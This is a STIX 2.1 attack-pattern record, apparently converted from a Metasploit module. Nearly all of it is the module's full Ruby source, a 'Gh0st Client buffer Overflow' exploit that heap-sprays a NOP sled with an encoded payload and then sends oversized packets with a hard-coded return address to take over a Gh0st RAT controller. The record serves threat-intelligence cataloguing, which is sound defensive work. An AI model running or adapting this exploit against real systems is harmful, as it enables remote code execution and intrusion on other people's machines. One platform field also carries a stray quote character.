{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f606dc4e-e424-44ef-bb57-a460880aed44",
    "created": "2024-08-14T16:47:26.63367Z",
    "modified": "2024-08-14T16:47:26.633674Z",
    "name": "Gh0st Client buffer Overflow",
    "description": " This module exploits a Memory buffer overflow in the Gh0st client (C2 server) ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/gh0st.rb",
            "external_id": "gh0st.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'zlib'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Gh0st Client buffer Overflow',\n      'Description'    => %q{\n          This module exploits a Memory buffer overflow in the Gh0st client (C2 server)\n      },\n      'Author'         => 'Professor Plum',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n          'AllowWin32SEH' => true\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1000,\n          'BadChars' => '',\n          'EncoderType' => Msf::Encoder::Type::AlphanumMixed\n        },\n      'Platform'       => 'win',\n      'DisclosureDate' => '2017-07-27',\n      'Targets'        =>\n        [\n          ['Gh0st Beta 3.6', { 'Ret' => 0x06001010 }]\n        ],\n      'Privileged'     => false,\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        OptString.new('MAGIC', [true, 'The 5 char magic used by the server', 'Gh0st']),\n        Opt::RPORT(80)\n      ]\n    )\n  end\n\n  def make_packet(id, data)\n    msg = id.chr + data\n    compressed = Zlib::Deflate.deflate(msg)\n    datastore['MAGIC'] + [13 + compressed.size].pack('V') + [msg.size].pack('V') + compressed\n  end\n\n  def validate_response(data)\n    if data.nil?\n      print_status('Server closed connection')\n      return false\n    end\n    if data.empty?\n      print_status('No response received')\n      return false\n    end\n    if data.size < 13\n      print_status('Invalid packet')\n      print_status(data)\n      return false\n    end\n    mag, pktlen, msglen = data[0..13].unpack('a' + datastore['MAGIC'].size.to_s + 'VV')\n    if mag.index(datastore['MAGIC']) != 0\n      print_status('Bad magic: ' + mag[0..datastore['MAGIC'].size])\n      return false\n    end\n    if pktlen != data.size\n      print_status('Packet size mismatch')\n      return false\n    end\n    msg = Zlib::Inflate.inflate(data[13..data.size])\n    if msg.size != msglen\n      print_status('Packet decompress failure')\n      return false\n    end\n    return true\n  end\n\n  def check\n    connect\n    sock.put(make_packet(101, \"\\x00\")) # heartbeat\n    if validate_response(sock.get_once || '')\n      return Exploit::CheckCode::Appears\n    end\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    print_status(\"Trying target #{target.name}\")\n    print_status('Spraying heap...')\n    for i in 0..100\n      connect\n      sock.put(make_packet(101, \"\\x90\" * 3 + \"\\x90\\x83\\xc0\\x05\" * 1024 * 1024 + payload.encoded))\n      if not validate_response(sock.get_once)\n        disconnect\n        return\n      end\n    end\n\n    for i in 103..107\n      print_status(\"Trying command #{i}...\")\n      begin\n        connect\n        sploit = make_packet(i, \"\\0\" * 1064 + [target['Ret'] - 0xA0].pack('V') + 'a' * 28)\n        sock.put(sploit)\n        if validate_response(sock.get_once)\n          next\n        end\n        sleep(0.1)\n        break\n      rescue EOFError\n        print_status('Invalid')\n      end\n    end\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-07-27",
    "x_mitre_platforms": [
        "win'"
    ]
}